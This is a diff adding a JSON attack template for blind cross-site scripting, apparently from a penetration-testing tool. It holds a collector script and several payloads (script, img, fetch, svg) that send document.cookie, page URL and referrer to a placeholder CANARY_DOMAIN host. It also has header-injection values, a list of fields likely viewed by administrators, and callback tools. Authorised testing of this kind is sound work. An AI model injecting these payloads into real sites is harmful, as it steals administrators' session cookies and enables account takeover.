@@ -1,0 +1,43 @@
+{
+  "type": "xss_blind",
+  "description": "Blind XSS: payload executes in a different browsing context (admin panel, logging system, email client). No immediate feedback — requires OOB callback to confirm.",
+  "approach": [
+    "1. Inject payload with OOB callback (payload phones home when executed)",
+    "2. Submit in ALL input fields — especially those likely viewed by internal users",
+    "3. Wait for callback — may take hours or days if admin reviews infrequently",
+    "4. Callback includes: cookies, URL, user-agent, DOM snapshot, screenshot"
+  ],
+  "oob_payload_template": "<script src='https://CANARY_DOMAIN/x.js'></script>",
+  "self_hosted_collector": {
+    "description": "Minimal JS to collect context when blind XSS fires",
+    "script": "new Image().src='https://CANARY_DOMAIN/blind?c='+btoa(document.cookie)+'&u='+btoa(location.href)+'&t='+btoa(document.title)+'&r='+btoa(document.referrer)"
+  },
+  "high_value_injection_points": [
+    "User-Agent header (often logged in admin panels)",
+    "Referer header (logged in access logs)",
+    "X-Forwarded-For header (logged in proxy logs)",
+    "User display name / username",
+    "Contact form message field",
+    "Support ticket description",
+    "Feedback form",
+    "Product review text",
+    "Bug report description",
+    "Chat message (if admins view chat logs)",
+    "Address / bio / company name fields",
+    "Payment description fields",
+    "CSV import fields (rendered in admin)"
+  ],
+  "payloads": {
+    "script_src": "<script src='https://CANARY_DOMAIN/b.js'></script>",
+    "img_oob": "<img src=x onerror=this.src='https://CANARY_DOMAIN/?c='+document.cookie>",
+    "fetch_oob": "<img src=x onerror=\"fetch('https://CANARY_DOMAIN/?d='+btoa(document.cookie))\">",
+    "svg_oob": "<svg onload=\"new Image().src='https://CANARY_DOMAIN/?c='+document.cookie\">",
+    "header_injection": {
+      "User-Agent": "<script src='https://CANARY_DOMAIN/ua.js'></script>",
+      "Referer": "https://CANARY_DOMAIN/<script>alert(1)</script>",
+      "X-Forwarded-For": "127.0.0.1\"><script>alert(1)</script>"
+    }
+  },
+  "tools": ["XSSHunter (self-hosted)", "Interactsh (projectdiscovery)", "Burp Collaborator (manual)"],
+  "confirmation": "Blind XSS confirmed when OOB callback received with cookie/URL data from admin context"
+}
